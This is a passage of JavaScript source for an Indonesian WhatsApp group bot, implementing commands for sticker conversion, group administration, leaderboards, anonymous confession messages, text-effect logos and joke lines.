┃• *User* : @${sender.split("@")[0]}
┃• *Hit* : ${cekUser("hit", sender)}
┃• *Emote* : ${cekUser("emote", sender)}
┃• *Star* : ${cekUser("star", sender)}⭐
┃• *Ban* : ${cekUser("ban", sender)}
┃• *Premium* : ${cekUser("premium", sender)}
╰━─━─━─━─━─━─━─•`)
break
case 'listmenu': case 'listhelp':
if (cekUser("id", sender) !== sender) return Notdaftar()
sendMedia("vn","./media/menu.mp3")
rimurubotz.sendMessage(from, {
text: "\n" + help(prefix, reply, cekUser, namabot, sender) + cr,
buttonText: "SOSMED(OWNER)",
mentions: [sender],
sections: [{ rows: [
{title: "IG : " + ig, rowId: prefix + "xx"},
{title: "FB : " + fb, rowId: prefix + "xx"},
{title: "yt : " + tt, rowId: prefix + "xx"},
{title: "WA : " + owner, rowId: prefix + "xx"}
]}]},{quoted:nay1})
var nyz = await fetchJson("https://md-devs.xyz/versi")
if (packagejson.description !== nyz.versi){rimurubotz.sendMessage("0@s.whatsapp.net", {text: `[ *UPDATE NEW* ]\n\n• *Info* : Kamu menggunakan Bot versi ${packagejson.description}, Dan sekarang telah tersedia versi Terbaru v${nyz.versi}, Ayo Coba versi yang sudah Terupdate, Link ${nyz.link}`},{quoted:nay1})}
break
case 'xx':
if (cekUser("id", sender) !== sender) return Notdaftar()
reply("😀")
break
case 'topstar':
if (cekUser("id", sender) !== sender) return Notdaftar()
user.sort((a, b) => (a.star < b.star) ? 1 : -1)
let topstar1 = 0
var top2 = "[ *TOPSTAR* ]\n"
var top3 = []
try{
for (let z = 0; z < 10; z++) {topstar1++
top2 += `[ ${topstar1} ]•[ @${user[z].id.split("@")[0]} ]•[ ${user[z].star} ]\n`
top3.push(user[z].id)
}
rimurubotz.sendMessage(from, {text: top2, mentions:top3},{quoted:nay1})
} catch (err) { reply("LEADERBOARD STAR TIDAK TERSEDIA SEKARANG, HARUS 10 ORANG MENDAFTAR DIBOT!")}
break
case 'tophit':
if (cekUser("id", sender) !== sender) return Notdaftar()
user.sort((a, b) => (a.hit < b.hit) ? 1 : -1)
let tophit1 = 0
var top2 = "[ *TOPHIT* ]\n"
var top3 = []
try{
for (let z = 0; z < 10; z++) {tophit1++
top2 += `[ ${tophit1} ]•[ @${user[z].id.split("@")[0]} ]•[ ${user[z].hit} ]\n`
top3.push(user[z].id)
}
rimurubotz.sendMessage(from, {text: top2, mentions:top3},{quoted:nay1})
} catch (err) { reply("LEADERBOARD HIT TIDAK TERSEDIA SEKARANG, HARUS 10 ORANG MENDAFTAR DIBOT!")}
break
case 's':
case 'sticker':
case 'stiker':
case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return Notdaftar()
try {
if (isMedia || isQuotedImage) { 
var stream = await downloadContentFromMessage(nay.message.imageMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.imageMessage, 'image')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.jpg', buffer)
const image = './res_buffer.jpg'
await ffmpeg(image)
.input(image)
.on('error', function (error) { only("error", rimurubotz, from) })
.on('end', function () {rimurubotz.sendMessage(from, { sticker: {url: './mysticker.webp'}, mimetype: 'image/webp' })})
.addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save('./mysticker.webp')} else if (isMedia || isQuotedVideo) {only("proses", rimurubotz, from)
var stream = await downloadContentFromMessage(nay.message.videoMessage || nay.message.extendedTextMessage?.contextInfo.quotedMessage.videoMessage, 'video')
var buffer = Buffer.from([])
for await(const chunk of stream) {buffer = Buffer.concat([buffer, chunk])}
fs.writeFileSync('./res_buffer.mp4', buffer)
const video = './res_buffer.mp4'
await ffmpeg(video)
.input(video)
.on('error', function (error) {reply("error")
console.log(`${error}`)})
.on('end', function () { rimurubotz.sendMessage(from, { sticker: {url: './mysticker2.webp' }, mimetype: 'image/webp' })})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save('./mysticker2.webp')} else {
reply('_Kirim gambar/video dengan caption !sticker/ reply gambar/video dengan perintah !sticker_ ')
}} catch (e) {only("error", rimurubotz, from)}
break
case 'owner':
if (cekUser("id", sender) == null) return Notdaftar()
sendMedia("vcard", namaowner, owner)
reply("Mau ngapain om? >///<")
break
case 'donasi': 
if (cekUser("id", sender) == null) return Notdaftar()
sendMedia("image", donasi, "Donasi kak minimal 1k❤")
break
case 'daftar': case 'login':
if (cekUser("id", sender) !== null) return reply("Kamu sudah terdaftar sebelumnya")
user.push({ id: sender, emote: "❤", timers: moment().format('LLL'), hit: 0, star: 1, afk: false, alasan:false, ban: false, premium: false, jawaban: false })
fs.writeFileSync('./lib/data.json', JSON.stringify(user, null, 2))
reply(`[ *NEW INFO* ] 
• *User* : ${sender.split("@")[0]}
• *Star* : ⭐[1]
• *Hit* : 0
• *Premium* : false
• *Ban* : false
• *Afk* : false
~> [🤖] : Selamat @${sender.split("@")[0]} Anda berhasil bergabung ke database bot pada ${moment().format('LLL')}`)
break

case 'delete':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup){
if (m.messages[0].isQuotedMsg == false) return reply("tag Pesan")
if (m.messages[0].quotedMsg.sender !== botNumber) return reply("Hanya bisa menghapus pesan bot, ... Silahkan reply pesan bot")
await rimurubotz.sendMessage(from, { delete: m.messages[0].quotedMsg })
only("sukses", rimurubotz, from) } else {
if (m.messages[0].isQuotedMsg == false) return reply("tag Pesan")
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (isBotGroupAdmins){
await rimurubotz.sendMessage(from, { delete: m.messages[0].quotedMsg })
only("sukses", rimurubotz, from)}
if (!isBotGroupAdmins){
if (m.messages[0].quotedMsg.sender !== botNumber) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.sendMessage(from, { delete: m.messages[0].quotedMsg })
only("sukses", rimurubotz, from)}}
break
case 'kick': case 'remove':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda kick")
rimurubotz.sendMessage(from, {text:`Byeee Byeee @${Tag()[0].split("@")[0]}`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "remove").catch(e => {only("error", rimurubotz, from)})
break
case 'hidetag': case 'tagall':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan text")
var nyz = [sender]
var nyzz = `[ *TAG-ALL* ]\n• *Dari* : @${sender.split("@")[0]}\n• *Time* : ${time}\n• *Pesan* : ${q}\n\n• *Tag-All(Admin-Member)* :\n`
Object.keys(groupMembers).forEach((i) => { 
nyz.push(groupMembers[i].id)
nyzz += `•> @${groupMembers[i].id.split("@")[0]}\n`
})
if (command == "hidetag"){
rimurubotz.sendMessage(from, {text: `[ *HIDETAG* ]\n• *Dari* : @${sender.split("@")[0]}\n• *Time* : ${time}\n• *Pesan* : ${q}`, mentions:nyz},{quoted:nay1})
} else { rimurubotz.sendMessage(from, {text: nyzz, mentions:nyz},{quoted:nay1}) }
break

case 'kicktime': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q2 && !q3){ if (Tag() == "") return reply("Tag Orang yang mau anda kick")
return rimurubotz.sendMessage(from, {
text: `[ *KICK-TIMERS* ]\nSilahkan Pilih Time`,
buttonText: "OPEN",
sections:  [{title: "TIMERS", rows: [
{title: "10 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 10000 + "&10 Detik"},
{title: "20 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 20000 + "&20 Detik"},
{title: "30 DETIK", rowId: prefix + "kicktime " + Tag() + "&" + 30000 + "&30 Detik"},
{title: "1 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 60000 + "&1 Menit"},
{title: "5 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 300000 + "&2 Menit"},
{title: "10 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 600000 + "&10 Menit"},
{title: "15 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 900000 + "&15 Menit"},
{title: "30 MENIT", rowId: prefix + "kicktime " + Tag() + "&" + 1800000 + "&30 Menit"},
{title: "1 JAM", rowId: prefix + "kicktime " + Tag() + "&" + 3600000 + "&1 Jam"}
]}]
})}
if (q1 && q2 && q3) {
rimurubotz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nSukses mengatur jadwal, @${q1.split("@")[0]} akan terKick Dalam ${q3}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
setTimeout( () => {
rimurubotz.groupParticipantsUpdate(from, [q1], "remove").catch(e => {only("error", rimurubotz, from)})
rimurubotz.sendMessage(from, {text:`[ *KICK-TIMERS* ]\nWaktu habis, Bye Byee!! @${q1.split("@")[0]}`, mentions:[`${q1.split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
}, q2)
}
break
case 'add': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Nomer, Contoh 62xxxxx")
var nyz = phone('+' + q);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid, Lakukan Seperti petunjuk yang di berikan, Contoh 62xxxx")
await rimurubotz.groupParticipantsUpdate(from, [nyz.phoneNumber.split("+")[1] + "@s.whatsapp.net"], "add").catch(e => {only("error", rimurubotz, from)})
break
case 'promote':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda promote")
rimurubotz.sendMessage(from, {text:`Selamat @${Tag()[0].split("@")[0]} Anda sekarang adalah admin👑`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "promote").catch(e => {only("error", rimurubotz, from)})
break
case 'demote':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (Tag() == "") return reply("tag Orang yang mau anda demote")
rimurubotz.sendMessage(from, {text:`Yahhh @${Tag()[0].split("@")[0]} Anda sekarang Bukan admin lagi😪`, mentions:[`${Tag()[0].split("@")[0]}@s.whatsapp.net`]},{quoted:nay1}) 
await rimurubotz.groupParticipantsUpdate(from, Tag(), "demote").catch(e => {only("error", rimurubotz, from)})
break 
case 'setname': case 'setsubject': case 'updatename':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 25) return reply("Nama terlalu panjang")
await rimurubotz.groupUpdateSubject(from, q)
only("sukses", rimurubotz, from)
break
case 'setdesk': case 'setdeks': case 'updatedesk':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return reply("Masukkan Text")
if (q.length > 500) return reply("Nama terlalu panjang")
await rimurubotz.groupUpdateDescription(from, q)
only("sukses", rimurubotz, from)
break 
case 'tutup': case 'close': case 'closegroup':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'announcement')
only("sukses", rimurubotz, from)
break
case 'open': case 'buka': case 'opengroup':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'not_announcement')
only("sukses", rimurubotz, from)
break
case 'unlocked': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'unlocked')
only("sukses", rimurubotz, from)
break
case 'locked': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupSettingUpdate(from, 'locked')
only("sukses", rimurubotz, from)
break
case 'linkgc': case 'linkgrup': case 'linkgrub': case 'linkgroup': case 'getlink':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
var nyz = await rimurubotz.groupInviteCode(from)
reply("[ *GROUP-CODE(LINK)* ]\nhttps://chat.whatsapp.com/" + nyz)
break
case 'revoke': case 'risetlink': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
await rimurubotz.groupRevokeInvite(from)
only("sukses", rimurubotz, from)
break
case 'welcome':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return rimurubotz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("welcome", "cek", from) == from) return reply("welcome pada group ini telah aktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("welcome", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("welcome", "cek", from) !== from) return reply("welcome pada group ini telah nonaktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("welcome", "remove", from)
} else { rimurubotz.sendMessage(from, {text: "[ *WELCOME* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "WELCOME (AKTIF)", rowId: prefix + command + " aktif"},{title: "WELCOME (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'antilink':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (!isGroupAdmins) return only("isGroupAdmins", rimurubotz, from)
if (!isBotGroupAdmins) return only("isBotGroupAdmins", rimurubotz, from)
if (!q) return rimurubotz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]})
if (q == "aktif") {
if (dataOnly("antilink", "cek", from) == from) return reply("antilink pada group ini telah aktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("antilink", "add", from)
} else 
if (q == "nonaktif"){
if (dataOnly("antilink", "cek", from) !== from) return reply("antilink pada group ini telah nonaktif sebelumnya")
only("sukses", rimurubotz, from)
dataOnly("antilink", "remove", from)
} else { rimurubotz.sendMessage(from, {text: "[ *ANTILINK* ]", buttonText: "OPEN", sections: [{title: "PILIH", rows: [{title: "ANTILINK (AKTIF)", rowId: prefix + command + " aktif"},{title: "ANTILINK (NONAKTIF)", rowId: prefix + command + " nonaktif"} ]}]}) } 
break
case 'setstatus': case 'updatestatus':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
if (q.length > 130) return reply("text terlalu panjang")
await rimurubotz.updateProfileStatus(q)
only("sukses", rimurubotz, from)
break
case 'setnamabot': case 'setnamebot': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
if (q.length > 24) return reply("text terlalu panjang")
await rimurubotz.updateProfileName(q)
only("sukses", rimurubotz, from)
break
case 'getpp': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
try{ var nyz = await rimurubotz.profilePictureUrl(Tag()[0], 'image') } catch (e) { var nyz = "http://assets.kompasiana.com/items/album/2021/03/24/blank-profile-picture-973460-1280-605aadc08ede4874e1153a12.png" }
rimurubotz.sendMessage(from, {image:{url:nyz}, caption:"xxx", mentions:[sender]},{quoted:nay1})
break
case 'block': case 'ban': case 'banned':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
await rimurubotz.updateBlockStatus(Tag()[0], "block")
setUser("±ban", `${Tag()[0]}`, true)
only("sukses", rimurubotz, from)
break 
case 'unblock': case 'unban': case 'unbanned':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
await rimurubotz.updateBlockStatus(Tag()[0], "unblock")
setUser("±ban", `${Tag()[0]}`, false)
only("sukses", rimurubotz, from)
break  
case 'creategroup':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isOwner) return only("isOwner", rimurubotz, from)
if (!q) return reply("Masukkan text")
const group = await rimurubotz.groupCreate(q, [owner + "@s.whatsapp.net"])
only("sukses", rimurubotz, from)
rimurubotz.sendMessage(group.id, { text: 'Halo!!' }) // say hello to everyone on the group
break
case 'plusstar':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
only("sukses", rimurubotz, from)
setUser("+star", `${Tag()[0]}`, 1)
break 
case 'minusstar':
if (cekUser("id", sender) == null) return Notdaftar()
if (!isGroup) return only("isGroup", rimurubotz, from)
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
only("sukses", rimurubotz, from)
setUser("-star", `${Tag()[0]}`, 1)
break
case 'addprem':
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
setUser("±premium", `${Tag()[0]}`, true)
only("sukses", rimurubotz, from)
break
case 'dellprem':
if (Tag() == "") return reply("tag Orang")
if (!isOwner) return only("isOwner", rimurubotz, from)
setUser("±premium", `${Tag()[0]}`, false)
only("sukses", rimurubotz, from)
break
case 'toimg':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedSticker) { 
download("sticker", "toimgg").then(x => { sendMedia("image", "./media/toimgg.webp", "SUKSES") })
} else { reply("Reply Sticker")}
break
case 'script': 
if (cekUser("id", sender) == null) return Notdaftar()
reply("https://youtube.com/channel/UCWypTAqhYCI45waiZg9T3Lg")
break
case 'confes': case 'menfes': case 'confess': case 'menfess':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q1 && !q2 && !q3) return reply(`> Masukkan\n${prefix + command} Nomer&Nama&Pesan\n\n> Contoh?\n${prefix + command} 62xxx&Asep&Halo`)
var nyz = phone('+' + q1);
if (nyz.isValid == false) return reply("Nomer Yang anda masukkan tidak valid")
rimurubotz.sendMessage(nyz.phoneNumber.split("+")[1] + "@s.whatsapp.net", {text: `[ *NEW-NOTIF* ]\nHalo *kamu*, Ada pesan rahasia nihh dari *${q2}*, Katanya *"${q3}"*, Dia ngirim pesan ini pas jam ${time}, Mau balas? Gunakan command #confes`},{quoted:nay1})
only("sukses", rimurubotz, from)
break
case 'report': case 'bug':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Ada kesalahan/Error Pada fitur? Silahkan masukkan Nama fitur yang bermasalah Kesini\nContoh? #report sticker")
rimurubotz.sendMessage(owner + "@s.whatsapp.net", {text: `[ *NEW-NOTIF* ]\nHalo *${namaowner}*, Ada keluhan untuk kamu, Dari *@${sender.split("@")[0]}*, Katanya *"${q} Tidak bisa digunakan"*, Dia ngirim pesan ini pas jam ${time}`, mentions:[sender]},{quoted:nay1})
reply("Terimakasih telah melaporkan bug/error pada fitur, Jika benar Fitur bermasalah owner akan memperbaiki masalah ini secepatnya, Owner akan mengabaikan jika pesan ini palsu")
break
case 'technology': case 'cuttext': case 'neonlight': case 'thundertext': case 'transformer': case 'sketchtext': case 'lighttext': 
case 'giraffetext':  case 'glasstext': case 'signtext': case 'juicetext': case 'typography': case 'potterytext': case 'comictext': case 'ruststyle': 
if (cekUser("id", sender) == null) return Notdaftar()
if (!q) return reply("Masukkan text")
if (command == "technology"){ var nyz1 = "https://textpro.me/create-a-futuristic-technology-neon-light-text-effect-1006.html" } else if (command == "cuttext"){ var nyz1 = "https://textpro.me/create-art-paper-cut-text-effect-online-1022.html" } else if (command == "neonlight"){ var nyz1 = "https://textpro.me/create-3d-neon-light-text-effect-online-1028.html" } else if (command == "thundertext"){ var nyz1 = "https://textpro.me/online-thunder-text-effect-generator-1031.html" } else if (command == "transformer"){ var nyz1 = "https://textpro.me/create-a-transformer-text-effect-online-1035.html" } else if (command == "sketchtext"){ var nyz1 = "https://textpro.me/create-a-sketch-text-effect-online-1044.html" } else if (command == "lighttext"){ var nyz1 = "https://textpro.me/create-glowing-neon-light-text-effect-online-free-1061.html" } else if (command == "giraffetext"){ var nyz1 = "https://textpro.me/create-3d-giraffe-text-effect-online-1069.html" } else if (command == "glasstext"){ var nyz1 = "https://textpro.me/create-3d-style-glass-text-effect-online-1072.html" } else if (command == "signtext"){ var nyz1 = "https://textpro.me/3d-business-sign-text-effect-1078.html" } else if (command == "juicetext"){ var nyz1 = "https://textpro.me/create-a-3d-orange-juice-text-effect-online-1084.html" } else if (command == "typography"){ var nyz1 = "https://textpro.me/create-artistic-typography-online-1086.html" } else if (command == "potterytext"){ var nyz1 = "https://textpro.me/create-3d-pottery-text-effect-online-1088.html" } else if (command == "comictext"){ var nyz1 = "https://textpro.me/create-3d-comic-text-effects-online-1091.html" } else if (command == "ruststyle"){ var nyz1 = "https://textpro.me/create-a-3d-rust-style-text-effect-online-1093.html" }
only("proses", rimurubotz, from)
var nyz = await textPro1(nyz1, q).catch(e => { only("error", rimurubotz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q}\n• *Status* : true`).catch(e => { only("error", rimurubotz, from) })
break
case 'steeltext': case 'metalgold': case 'metalgalaxy': case 'rosegold': case 'metalonline': case 'logoonline': case 'stonetext': 
case 'styletiktok': case 'vintage': case 'graffititext': case 'texteffect': case 'layeredtext': case 'screentext': case 'summertext':
if (cekUser("id", sender) == null) return Notdaftar()
if (!q1 && !q2) return reply("Masukkan text1&text2")
if (command == "steeltext"){ var nyz1 = "https://textpro.me/3d-steel-text-effect-877.html" } else if (command == "metalgold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-gold-944.html" } else  if (command == "metalgalaxy"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-galaxy-943.html" } else  if (command == "rosegold"){ var nyz1 = "https://textpro.me/text-logo-3d-metal-rose-gold-945.html" } else if (command == "metalonline"){ var nyz1 = "https://textpro.me/create-text-logo-3d-metal-online-957.html" } else if (command == "logoonline"){ var nyz1 = "https://textpro.me/pornhub-style-logo-online-generator-free-977.html" } else if (command == "stonetext"){ var nyz1 = "https://textpro.me/create-a-stone-text-effect-online-982.html" } else if (command == "styletiktok"){ var nyz1 = "https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html" } else if (command == "vintage"){ var nyz1 = "https://textpro.me/create-realistic-vintage-style-light-bulb-1000.html" } else if (command == "graffititext"){ var nyz1 = "https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html" } else if (command == "texteffect"){ var nyz1 = "https://textpro.me/create-a-glitch-text-effect-online-free-1026.html" } else if (command == "layeredtext"){ var nyz1 = "https://textpro.me/create-layered-text-effects-online-free-1032.html" } else if (command == "screentext"){ var nyz1 = "https://textpro.me/color-led-display-screen-text-effect-1059.html" } else if (command == "summertext"){ var nyz1 = "https://textpro.me/create-a-summer-text-effect-with-a-palm-tree-1083.html" } 
only("proses", rimurubotz, from) 
var nyz = await textPro2(nyz1, q1, q2).catch(e => { only("error", rimurubotz, from) })
sendMedia("image", nyz.result.url_file, `[ *TEXTPRO* ]\n• *Title* : ${command}\n• *Text1* : ${q1}\n• *Text2* : ${q2}\n• *Status* : true`).catch(e => { only("error", rimurubotz, from) })
break

case 'baperin1': case 'baperin2': case 'baperin3': case 'baperin4': case 'baperin5': case 'baperin6': case 'baperin7': case 'baperin8': case 'baperin9':  case 'baperin10': 
if (cekUser("id", sender) == null) return Notdaftar()
var nyz = body.slice(8).trim().split(/ +/).shift().toLowerCase()
if (Tag() == "") { var x1 = sender.split("@")[0] } else if (isGroup && Tag() !== "") { var x1 = Tag()[0].split("@")[0] }
if (nyz == 1) { var x = `Jika saja aku harus mengorbankan semua kebahagiaanku hanya untuk sekadar membuat @${x1} tertawa. Aku rela` }
if (nyz == 2) { var x = `Jangankan memilikimu, mendengar @${x1} kentut aja aku sudah bahagia` }
if (nyz == 3) { var x = `Ada 3 hal yang paling aku sukai di dunia ini, yaitu matahari, bulan dan @${x1}. Matahari untuk siang hari, bulan untuk malam hari, dan @${x1} untuk selamanya di hatiku` }
if (nyz == 4) { var x = `@${x1} itu seperti garam di lautan, tidak terlihat namun akan selalu ada untuk selamanya` }
if (nyz == 5) { var x = `Kalau @${x1} adalah bumi, maka aku adalah atmosfernya. Dengan begitu setiap saat bisa melindungimu dari sakitnya serangan meteor dan komet` }
if (nyz == 6) { var x = `@${x1} memang seperti lempeng bumi, bergeser sedikit saja sudah mengguncang hatiku` }
if (nyz == 7) { var x = `Kata dimulai dengan ABC, angka dimulai dengan 123. Lagu dimulai dengan do re mi. Cinta dimulai dengan aku dan @${x1}` }
if (nyz == 8) { var x = `Ada 12 bulan dalam setahun, 30 hari dalam sebulan, 7 hari dalam seminggu, 60 detik dalam satu jam. Tapi hanya ada @${x1} seorang sepanjang hidupku` }
if (nyz == 9) { var x = `Sejak mengenal @${x1} bawaannya aku pengen belajar terus, belajar menjadi yang terbaik buat kamu @${x1}` }
if (nyz == 10) { var x = `Napas aku kok sesek banget ya? Oh iya Karena separuh napasku ada di @${x1}` }
sendMedia("vn", "./media/baperin.mp3")
if (Tag() == "") return reply(x)
rimurubotz.sendMessage(from, {text:x, mentions:Tag()},{quoted:nay1})
break

case 'wangy': case 'sherk': case 'simp': case 'nenen': 
if (cekUser("id", sender) == null) return Notdaftar()
if (Tag() == "") return reply("tag Orang")
if (command == "wangy"){ var nyz = await api.stress.wangy("@" + Tag()[0].split("@")[0]) }
if (command == "nenen"){ var nyz = await api.stress.nenen("@" + Tag()[0].split("@")[0]) }
if (command == "simp"){ var nyz = await api.stress.simp("@" + Tag()[0].split("@")[0]) }
if (command == "sherk"){ var nyz = await api.stress.sherk("@" + Tag()[0].split("@")[0]) }
rimurubotz.sendMessage(from, {text:nyz, mentions:Tag()},{quoted:nay1})
break
case 'playmp3': case 'playaudio': case 'playmp4': case 'playvideo': case 'ytvideo': case 'ytmp4': case 'ytmp3': case 'ytaudio': case 'tiktokaudio': case 'tiktokmp3': case 'tiktokvideo': case 'tiktokmp4':
reply("[ *ERR* ] Fitur Ini di nonaktifkan")
break

case 'addfoto': case 'addimg': case 'addimage':
if (cekUser("id", sender) == null) return Notdaftar()
if (isMedia || isQuotedImage) { 
if (!q) return reply(`Masukkan Query Nama image, Contoh ${prefix + command} megawati`)
